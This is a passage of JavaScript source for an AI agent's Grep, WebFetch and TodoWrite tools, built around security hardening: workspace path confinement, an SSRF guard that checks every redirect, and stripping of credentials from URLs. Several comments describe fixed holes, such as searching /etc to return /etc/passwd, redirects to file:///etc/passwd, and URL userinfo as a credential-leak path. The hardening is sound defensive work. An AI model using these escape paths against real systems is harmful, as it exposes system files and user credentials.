 * The final segment is excluded: it is the basename, and confinement of the
 * matches themselves covers it.
 */
function literalDirPrefix(pattern) {
  const segments = pattern.split('/')
  const literal = []
  for (let i = 0; i < segments.length - 1; i++) {
    if (/[*?[\]{}]/.test(segments[i])) break
    literal.push(segments[i])
  }
  return literal.join('/')
}

/** {@link validateRawPathWithinCwd}, fail-closed on any resolution error. */
async function isWithin(rawPath, realRoot, cwdRealCache, cwdCacheTtl) {
  try {
    const { valid } = await validateRawPathWithinCwd(rawPath, realRoot, cwdRealCache, cwdCacheTtl)
    return valid
  } catch {
    return false
  }
}

async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Prefer ripgrep; fall back to grep. Both honor -i and -n. The if/then/else
  // (NOT `rg || grep`) keeps a no-match rg exit-1 from re-running the search
  // under grep (Copilot review on #4060). executeBash captures the exit code
  // (doesn't reject), so no `; true` mask is needed here. Builders are shared
  // with the docker-byok container Grep (#5882).
  const { ci, ln, globArg } = buildGrepArgs(input)
  const cmd = buildGrepCommand({ pattern, root: realRoot, ci, ln, globArg })

  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 60_000,
    env: buildSafeBashEnv(),
  })
  // grep/rg both return exit 1 on "no matches" — that's not an error
  // for our purposes. Only exit 2+ or stderr-without-stdout signals an
  // actual failure.
  if (result.stderr && !result.stdout && result.exitCode !== 1) {
    return { content: `Grep failed: ${result.stderr.trim()}`, isError: true }
  }
  if (!result.stdout) return { content: `No matches for ${pattern}`, isError: false }
  return { content: result.stdout, isError: false }
}

/**
 * Validate that an optional `path` argument (for Glob/Grep search roots)
 * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
 * the realpath so the caller can pass it to bash safely (the spawned
 * shell uses the realpath, not the original symlinked alias).
 *
 * SECURITY: an earlier draft of this function only rejected literal `..`
 * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
 * search the entire filesystem and return /etc/passwd etc. Caught by
 * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
 * path through the same machinery the Read/Write/Edit tools use.
 */
async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof p !== 'string' || p.length === 0) return cwd
  // #6923 — pass the RAW path; see safeResolve for why pre-`resolve()` is unsafe
  // (lexical `..` collapse hides a symlink+`..` escape).
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    p,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

const WEBFETCH_DEFAULT_TIMEOUT_MS = 30_000
const WEBFETCH_TIMEOUT_CEILING_MS = 120_000
const WEBFETCH_MAX_RAW_BYTES = 1_048_576       // 1 MB cap on body read from socket
const WEBFETCH_MAX_OUTPUT_CHARS = 100_000      // 100 KB cap on text returned to model
// #4132: undici's default redirect cap is 20. Ours is tighter so the
// model can't burn its turn on a redirect-loop honeypot — and we
// re-validate scheme + host on every hop, so the loop is also a
// per-hop SSRF gate, not just a count.
const WEBFETCH_MAX_REDIRECT_HOPS = 10

async function isHostAllowed(hostname) {
  if (process.env.CHROXY_WEBFETCH_ALLOW_PRIVATE === '1') return true
  if (typeof hostname !== 'string' || hostname.length === 0) return false
  // URL.hostname returns IPv6 literals WITH square brackets ('[::1]'),
  // and node:net isIP doesn't accept brackets. Strip them before the
  // isIP probe so legitimate public IPv6 URLs aren't all rejected as
  // unresolvable hostnames. (Caught by /agent-review on #4165 — #4166.)
  const probe = hostname.startsWith('[') && hostname.endsWith(']')
    ? hostname.slice(1, -1)
    : hostname
  if (isIP(probe)) return !isPrivateOrSpecialIp(probe)
  try {
    // Resolve ALL addresses (both families). A multi-A host that returns
    // a public IP plus a private IP would otherwise slip past with the
    // single-address default — `fetch` may then pick the private one.
    // Refuse if ANY resolved address is private/special. (Copilot review
    // on #4165.)
    const addresses = await dnsLookup(probe, { all: true })
    if (!Array.isArray(addresses) || addresses.length === 0) return false
    for (const { address } of addresses) {
      if (isPrivateOrSpecialIp(address)) return false
    }
    return true
  } catch {
    // Unresolvable host — refuse rather than letting fetch try.
    return false
  }
}

async function runWebFetch({ input, signal }) {
  const rawUrl = input?.url
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) {
    return { content: 'EINVAL: url is required', isError: true }
  }
  const rawPrompt = input?.prompt
  if (typeof rawPrompt !== 'string' || rawPrompt.length === 0) {
    return { content: 'EINVAL: prompt is required', isError: true }
  }
  let parsed
  try {
    parsed = new URL(rawUrl)
  } catch {
    // #4159: do NOT echo rawUrl here — a URL that fails to parse can
    // still contain userinfo (e.g. `http://alice:hunter2@` fails the
    // host check) and any echo lands in conversation history.
    return { content: 'EINVAL: malformed url (could not be parsed as http(s))', isError: true }
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      content: `EINVAL: only http(s) URLs are supported (got ${parsed.protocol})`,
      isError: true,
    }
  }
  // #4133: strip user:pass@ userinfo before either echoing the URL back
  // to the model OR passing it to fetch(). Two reasons:
  //   1. The model's tool_result lands in conversation history and gets
  //      resent to the Anthropic API on the next turn — userinfo in the
  //      URL is a credential exfiltration path.
  //   2. Node fetch refuses URLs containing credentials outright with
  //      an error that itself echoes the credentialed URL, so even the
  //      failure path leaks. Stripping here turns the fetch into an
  //      unauthenticated request — the server may 401 / 403, which is
  //      surfaced cleanly without exposing the creds.
  // #4160: remember whether userinfo was present so the result header
  // can surface a `[userinfo stripped from ...]` marker — a silent strip
  // turns a downstream 401 into a mysterious failure that the model can't
  // diagnose. The marker is the design trade-off worth flagging.
  //
  // #4183: track input-URL strip and redirect-hop strip as SEPARATE flags
  // so the marker can say exactly where the credentials came from. The
  // pre-#4183 single `hadUserinfo` flag produced a marker adjacent to
  // `currentUrl` (which may be a redirect destination), so a reader
  // could plausibly think the marker referred to the displayed URL
  // even when the strip happened on the input or on an earlier hop.
  // Distinguishing the two sources keeps the marker honest in the
  // redirect-chain case without changing where it sits in the result.
  const inputHadUserinfo = Boolean(parsed.username || parsed.password)
  let redirectHadUserinfo = false
  if (inputHadUserinfo) {
    parsed.username = ''
    parsed.password = ''
  }

  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, WEBFETCH_TIMEOUT_CEILING_MS)
    : WEBFETCH_DEFAULT_TIMEOUT_MS

  const ac = new AbortController()
  const timer = setTimeout(() => ac.abort(new Error('timeout')), timeoutMs)
  // Forward an external abort signal (session destroy) into our local
  // controller. If the signal is ALREADY aborted at entry, the listener
  // wouldn't fire — short-circuit so a destroyed session doesn't make an
  // outbound request.
  const onExternalAbort = () => ac.abort(signal.reason)
  if (signal) {
    if (signal.aborted) ac.abort(signal.reason)
    else signal.addEventListener('abort', onExternalAbort, { once: true })
  }

  try {
    // #4132: SSRF check on the initial URL. Done before any network
    // attempt so an attacker can't even confirm a private host is
    // listening on the chroxy host.
    if (!(await isHostAllowed(parsed.hostname))) {
      return {
        content:
          `EACCES: refusing to fetch private/loopback/link-local host (${parsed.hostname}). ` +
          'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in (local dev only — this is an SSRF guard).',
        isError: true,
      }
    }

    // #4132: manual redirect handling so we can re-validate scheme +
    // host on every hop. `redirect: 'follow'` would otherwise honour an
    // attacker's redirect to file:// (well, undici would refuse it
    // with a vague network error) or to a private IP (which undici
    // happily follows).
    let res
    let currentUrl = parsed
    for (let hop = 0; hop <= WEBFETCH_MAX_REDIRECT_HOPS; hop++) {
      res = await fetch(currentUrl.toString(), {
        signal: ac.signal,
        redirect: 'manual',
        headers: { 'user-agent': 'chroxy-webfetch/1.0' },
      })
      if (res.status < 300 || res.status >= 400) break
      const loc = res.headers.get('location')
      // Drain the body so the connection can return to the pool.
      try { await res.body?.cancel() } catch { /* connection already torn down */ }
      if (!loc) {
        return { content: `WebFetch redirect ${res.status} with no Location header`, isError: true }
      }
      let nextUrl
      try {
        nextUrl = new URL(loc, currentUrl)
      } catch {
        return { content: `WebFetch refused redirect: malformed Location header`, isError: true }
      }
      // #4182 (Copilot review): a Location header can introduce
      // `user:pass@` userinfo on any hop. Strip it BEFORE the next fetch
      // — Node fetch refuses credentialed URLs with an error that echoes
      // the credentialed URL, which would then leak via the catch-all
      // `WebFetch failed: ${err.message}` path.
      // #4183: set `redirectHadUserinfo` (separate from `inputHadUserinfo`)
      // so the result marker can name where the credentials came from
      // rather than ambiguously claiming "userinfo stripped" next to a
      // URL that may not itself have carried any.
      if (nextUrl.username || nextUrl.password) {
        redirectHadUserinfo = true
        nextUrl.username = ''
        nextUrl.password = ''
      }
      if (nextUrl.protocol !== 'http:' && nextUrl.protocol !== 'https:') {
        // The Location header is attacker-controlled, so don't echo it
        // verbatim — that's a prompt-injection surface AND would leak
        // sensitive paths (e.g. file:///etc/passwd). Just report the
        // scheme. (Copilot review on #4165.)
        return {
          content: `WebFetch refused redirect scheme: only http(s) allowed (got ${nextUrl.protocol})`,
          isError: true,
        }
      }
      if (!(await isHostAllowed(nextUrl.hostname))) {
        return {
          content:
            `WebFetch refused redirect to private/loopback/link-local host (${nextUrl.hostname}). ` +
            'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in.',
          isError: true,
        }
      }
      if (hop === WEBFETCH_MAX_REDIRECT_HOPS) {
        return {
          content: `WebFetch hit redirect cap: too many redirects (>${WEBFETCH_MAX_REDIRECT_HOPS} hops)`,
          isError: true,
        }
      }
      currentUrl = nextUrl
    }

    // Compute the marker AFTER the redirect loop so it reflects any
    // userinfo stripped on a hop (#4182 Copilot review). #4183: name the
    // SOURCE of the stripped credentials so the marker is unambiguous
    // when `currentUrl` is a redirect destination that didn't itself
    // carry userinfo. The four arms are mutually exclusive at the
    // boolean level; the cross case is a single combined message rather
    // than two stacked markers.
    const userinfoMarker = (() => {
      if (inputHadUserinfo && redirectHadUserinfo) {
        return ' [userinfo stripped from input URL and redirect Location]'
      }
      if (inputHadUserinfo) return ' [userinfo stripped from input URL]'
      if (redirectHadUserinfo) return ' [userinfo stripped from redirect Location]'
      return ''
    })()

    if (!res.ok) {
      return {
        content: `HTTP ${res.status} ${res.statusText} from ${currentUrl.toString()}${userinfoMarker}`,
        isError: true,
      }
    }

    const ctype = (res.headers.get('content-type') || '').toLowerCase()
    if (isBinaryContentType(ctype)) {
      return {
        content: `Unsupported content-type for WebFetch: ${ctype || 'unknown'} (binary content is not extracted to text).`,
        isError: true,
      }
    }

    // #4134: respect the declared charset rather than blindly utf-8.
    // Legacy sites still serve ISO-8859-1, Shift_JIS, GB2312, etc.; an
    // unconditional utf-8 decode produces mojibake that the model
    // can't reason about. Falls back to utf-8 when charset is missing,
    // unknown, or rejected by TextDecoder.
    const charset = pickCharset(ctype)
    const raw = await readBodyCapped(res, WEBFETCH_MAX_RAW_BYTES, charset)
    const isHtml = ctype.includes('text/html') || ctype.includes('application/xhtml')
    const text = isHtml ? stripHtmlToText(raw.text) : raw.text
    const { output, outputTruncated } = capOutput(text, WEBFETCH_MAX_OUTPUT_CHARS)

    // Distinct markers so the model can tell whether it lost data at the
    // socket (raw cap) or after HTML extraction (output cap). Output cap
    // takes precedence in the marker because that's the final visible cut.
    let marker = ''
    if (outputTruncated) {
      marker = `\n\n[truncated at output cap: ${WEBFETCH_MAX_OUTPUT_CHARS} chars]`
    } else if (raw.truncated) {
      marker = `\n\n[truncated at raw body cap: ${WEBFETCH_MAX_RAW_BYTES} bytes]`
    }

    return {
      content: `Prompt: ${rawPrompt}\nURL: ${currentUrl.toString()}${userinfoMarker}\n\n${output}${marker}`,
      isError: false,
    }
  } catch (err) {
    // ac.abort(reason) surfaces `reason` as the thrown error rather than
    // wrapping it in AbortError. The most reliable signal that we aborted
    // is the controller's signal.aborted state — message-string matching
    // misses arbitrary user-supplied reasons (e.g. "session destroyed").
    if (ac.signal.aborted) {
      return { content: `WebFetch timed out or aborted after ${timeoutMs}ms`, isError: true }
    }
    return { content: `WebFetch failed: ${err?.message || String(err)}`, isError: true }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', onExternalAbort)
  }
}

function isBinaryContentType(ctype) {
  if (!ctype) return false
  if (ctype.startsWith('text/')) return false
  if (ctype.includes('json') || ctype.includes('xml') || ctype.includes('javascript')
      || ctype.includes('yaml') || ctype.includes('+text')) return false
  return true
}

/**
 * Pick a TextDecoder-compatible charset label from a Content-Type header.
 * Returns 'utf-8' when missing, unparseable, or rejected by TextDecoder
 * (so the caller never has to handle a thrown constructor).
 */
function pickCharset(ctype) {
  if (!ctype) return 'utf-8'
  // Match `charset=foo` allowing quoted values per RFC 7231. Anchor on
  // a parameter-boundary (start-of-string or `;`) so a contrived header
  // like `text/html; xcharset=fakeout` can't have its tail matched and
  // mistaken for the real `charset` parameter. (#4162)
  const m = ctype.match(/(?:^|;)\s*charset\s*=\s*"?([\w.:+-]+)"?/i)
  if (!m) return 'utf-8'
  const label = m[1]
  try {
    // Constructor throws if the label is unknown to the WHATWG registry.
    // We only use the throw signal — `new TextDecoder(label)` itself is
    // not retained; the real decoder is built per-call in readBodyCapped.
    new TextDecoder(label)
    return label
  } catch {
    return 'utf-8'
  }
}

async function readBodyCapped(res, maxBytes, charset = 'utf-8') {
  // pickCharset has already validated the label, so this can't throw.
  const decoder = new TextDecoder(charset)
  const reader = res.body?.getReader()
  if (!reader) {
    // Defensive fallback for the (unreachable in practice) case where
    // fetch returns no body stream. Use arrayBuffer + TextDecoder so
    // both paths apply the same charset AND the same byte-based cap —
    // res.text() would (a) hard-wire utf-8 in undici and (b) measure
    // the cap in chars, not bytes. Keeps the contract consistent.
    const ab = await res.arrayBuffer()
    const bytes = Buffer.from(ab)
    if (bytes.byteLength > maxBytes) {
      return { text: decoder.decode(bytes.subarray(0, maxBytes)), truncated: true }
    }
    return { text: decoder.decode(bytes), truncated: false }
  }
  const chunks = []
  let total = 0
  let truncated = false
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    if (!value) continue
    total += value.byteLength
    if (total > maxBytes) {
      const overflow = total - maxBytes
      chunks.push(value.subarray(0, value.byteLength - overflow))
      truncated = true
      try { await reader.cancel() } catch { /* fetch already winding down */ }
      break
    }
    chunks.push(value)
  }
  const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)))
  return { text: decoder.decode(buf), truncated }
}

const HTML_ENTITY_MAP = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&apos;': "'",
  '&#39;': "'",
  '&nbsp;': ' ',
}

function stripHtmlToText(html) {
  // 1. Drop <script> and <style> blocks completely (body and all).
  let s = html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<!--[\s\S]*?-->/g, '')
  // 2. Treat block-level tags as line breaks so paragraphs don't merge.
  s = s.replace(/<\/?(p|div|h[1-6]|li|tr|br|hr|section|article|header|footer|nav|aside)\b[^>]*>/gi, '\n')
  // 3. Strip remaining tags.
  s = s.replace(/<[^>]+>/g, '')
  // 4. Decode named entities + numeric (decimal + hex) entities.
  s = s.replace(/&(?:amp|lt|gt|quot|apos|#39|nbsp);/g, (m) => HTML_ENTITY_MAP[m])
  s = s.replace(/&#(\d+);/g, (_, n) => safeFromCodePoint(Number(n)))
  s = s.replace(/&#x([0-9a-fA-F]+);/g, (_, h) => safeFromCodePoint(parseInt(h, 16)))
  // 5. Collapse whitespace per line + trim aggressive blank-line runs.
  s = s.split('\n').map((line) => line.replace(/[ \t]+/g, ' ').trim()).join('\n')
  s = s.replace(/\n{3,}/g, '\n\n').trim()
  return s
}

// Unicode code points are 0..0x10FFFF and the surrogate range 0xD800..0xDFFF
// is reserved (passing those to fromCodePoint also throws). Return empty
// string for out-of-range values so a malicious entity like &#9999999999;
// can't crash the entire WebFetch.
function safeFromCodePoint(code) {
  if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF) return ''
  if (code >= 0xD800 && code <= 0xDFFF) return ''
  return String.fromCodePoint(code)
}

function capOutput(text, maxChars) {
  if (text.length <= maxChars) {
    return { output: text, outputTruncated: false }
  }
  return { output: text.slice(0, maxChars), outputTruncated: true }
}

/**
 * Merge a partial todo list into the session's `todoStore` (Map keyed by
 * id). Items in the call replace existing entries with the same id;
 * items not mentioned in the call are preserved (merge semantics — see
 * #4051 acceptance criteria). Validates each item before mutating so a
 * mid-list invalid entry doesn't half-apply the update.
 */
function runTodoWrite({ input, todoStore }) {
  if (!todoStore || !(todoStore instanceof Map)) {
    return {
      content: 'EINTERNAL: TodoWrite requires a session-scoped store (byok-session.js wires this).',
      isError: true,
    }
  }
  const todos = input?.todos
  if (!Array.isArray(todos)) {
    return { content: 'EINVAL: todos must be an array', isError: true }
  }

  // Validate every item BEFORE mutating so a bad item halfway through
  // doesn't leave the store in a partially-applied state.
  const seenIds = new Set()
  for (let i = 0; i < todos.length; i++) {
    const t = todos[i]
    if (!t || typeof t !== 'object') {
      return { content: `EINVAL: todos[${i}] must be an object`, isError: true }
    }
    if (typeof t.id !== 'string' || t.id.length === 0) {
      return { content: `EINVAL: todos[${i}].id is required (string)`, isError: true }
    }
    // #4138: reject duplicate ids within a single call. A duplicate is
    // almost certainly a model bug; rejecting it lets the model see the
    // mistake and self-correct rather than letting the last write win
    // silently. Across separate calls, merge-by-id is unchanged.
    // JSON.stringify on the id (same shape used for `status` below) keeps
    // the error parseable when an id contains quotes / newlines / control
    // chars — raw single-quotes would mangle.
    if (seenIds.has(t.id)) {
      return {
        content: `EINVAL: todos[${i}].id ${JSON.stringify(t.id)} duplicates an earlier entry in this call`,
        isError: true,
      }
    }
    seenIds.add(t.id)
    if (typeof t.content !== 'string' || t.content.length === 0) {
      return { content: `EINVAL: todos[${i}].content is required (string)`, isError: true }
    }
    if (typeof t.status !== 'string' || !TODO_STATUSES.has(t.status)) {
      return {
        content: `EINVAL: todos[${i}].status must be one of pending|in_progress|completed (got ${JSON.stringify(t.status)})`,
        isError: true,
      }
    }
    if (t.activeForm !== undefined && typeof t.activeForm !== 'string') {
      return { content: `EINVAL: todos[${i}].activeForm must be a string when present`, isError: true }
    }
  }

  // Apply the merge.
  for (const t of todos) {
    const entry = { id: t.id, content: t.content, status: t.status }
    if (typeof t.activeForm === 'string') entry.activeForm = t.activeForm
    todoStore.set(t.id, entry)
  }

  // Build a readable summary from the FULL current list (post-merge).
  // The model already sees the call in its history; this confirmation
  // exists so a partial call still surfaces unrelated items. The output
  // is capped so a runaway list (or pathologically long `content`)
  // doesn't balloon conversation history toward token-limit cliffs —
  // the full Map stays server-side; only the rendered summary is capped.
  const all = [...todoStore.values()]
  const counts = { pending: 0, in_progress: 0, completed: 0 }
  for (const t of all) counts[t.status]++

  const header = `Todo list (${all.length} items): ${counts.in_progress} in progress, ${counts.pending} pending, ${counts.completed} completed`
  const visible = all.slice(0, TODOWRITE_MAX_ITEMS_RENDERED)
  const lines = [header]
  for (const t of visible) {
    const marker = t.status === 'completed' ? '[x]' : t.status === 'in_progress' ? '[~]' : '[ ]'
    const content = t.content.length > TODOWRITE_MAX_CONTENT_RENDERED
      ? t.content.slice(0, TODOWRITE_MAX_CONTENT_RENDERED) + '…'
      : t.content
    lines.push(`  ${marker} ${content} (${t.id})`)
  }
  if (all.length > visible.length) {
    lines.push(`  … (showing first ${visible.length} of ${all.length}; full list retained server-side)`)
  }
  return { content: lines.join('\n'), isError: false }
}

const TODOWRITE_MAX_ITEMS_RENDERED = 100
const TODOWRITE_MAX_CONTENT_RENDERED = 200
